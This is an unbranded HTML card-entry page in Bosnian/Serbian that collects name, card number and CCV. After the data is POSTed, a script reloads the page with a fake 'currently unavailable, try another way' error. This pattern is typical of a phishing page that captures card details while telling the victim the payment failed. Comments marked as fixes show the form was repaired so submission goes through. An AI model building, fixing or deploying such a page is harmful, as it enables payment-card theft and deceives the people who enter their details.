

<!DOCTYPE html>
<html lang="bs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unos kartice</title>

    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .card {
            background: white;
            width: 350px;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
            text-align: center;
        }

        h2 {
            text-align: center;
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin: 15px 0 6px;
            font-weight: bold;
            text-align: left;
        }

        input {
            width: 100%;
            box-sizing: border-box;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
        }

        button {
            width: 100%;
            margin-top: 25px;
            padding: 13px;
            border: none;
            border-radius: 8px;
            background: #2563eb;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background: #1d4ed8;
        }

        .error {
            display: none;
        }

        .error-icon {
            font-size: 70px;
            color: #dc2626;
            margin-bottom: 15px;
        }

        .error-text {
            font-size: 18px;
            color: #333;
            line-height: 1.5;
        }
    </style>
</head>

<body>

    <div class="card">

        <div id="formContent">
            <h2>Podaci kartice</h2>

            <!-- POPRAVLJENO: Zatvoren form tag sa '>' i dodata ispravna podešavanja -->
            <form id="cardForm" method="POST" action="">
                <label for="name">1. Ime na kartici</label>
                <input
                    type="text"
                    id="name"
                    name="name"
                    placeholder="Ime Prezime"
                    autocomplete="cc-name"
                    required
                >

                <label for="number">2. Broj kartice</label>
                <input
                    type="text"
                    id="number"
                    name="number"
                    placeholder="1234 5678 9012 3456"
                    autocomplete="cc-number"
                    inputmode="numeric"
                    required
                >

                <label for="ccv">3. CCV</label>
                <input
                    type="password"
                    id="ccv"
                    name="ccv"
                    placeholder="123"
                    autocomplete="cc-csc"
                    inputmode="numeric"
                    maxlength="4"
                    required
                >

                <button type="submit">Nastavi</button>
            </form> <!-- POPRAVLJENO: Zatvoren tag forme koji je falio -->
        </div>

        <div id="errorMessage" class="error">
            <div class="error-icon">✕</div>
            <div class="error-text">
                Trenutno je nedostupno.<br>
                Pokušajte na drugi način.
            </div>
        </div>

    </div>

    <script>
        // Ako URL sadrži parametar '?error=true', odmah prikaži poruku o grešci umesto forme
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('error') === 'true') {
            document.getElementById("formContent").style.display = "none";
            document.getElementById("errorMessage").style.display = "block";
        }

        // POPRAVLJENO: Forma se šalje normalno, a preusmeravanje simulira grešku nakon slanja
        document.getElementById("cardForm").addEventListener("submit", function(event) {
            // Podešavamo akciju forme da nakon slanja ponovo učita istu stranicu ali sa greškom
            this.action = window.location.pathname + "?error=true";
        });
    </script>

</body>
</html>
